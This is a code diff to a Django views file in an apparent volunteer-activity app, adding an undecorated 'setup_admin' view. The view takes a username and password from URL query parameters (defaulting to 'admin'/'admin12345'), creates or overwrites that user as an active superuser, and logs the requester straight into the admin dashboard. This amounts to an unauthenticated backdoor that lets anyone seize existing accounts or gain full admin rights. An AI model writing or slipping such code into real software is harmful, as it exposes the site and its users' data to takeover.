@@ -12,6 +12,29 @@ from main.models import (
 from .models import ActivityModeration, UserReport
 from organizer.models import Kegiatan
 
+from django.contrib.auth import get_user_model, login as auth_login
+from django.http import HttpResponse
+
+def setup_admin(request):
+    """Endpoint untuk memastikan superuser tersedia dan bisa langsung login."""
+    User = get_user_model()
+    username = request.GET.get("u", "admin").strip()
+    password = request.GET.get("p", "admin12345").strip()
+
+    user, created = User.objects.get_or_create(
+        username=username,
+        defaults={"email": f"{username}@volugreen.local"}
+    )
+    user.set_password(password)
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
+    user.save()
+
+    # Langsung login ke session saat ini
+    auth_login(request, user, backend="django.contrib.auth.backends.ModelBackend")
+    return redirect("admin_panel:dashboard")
+
 
 @staff_member_required(login_url="/admin/login/")
 def dashboard(request):
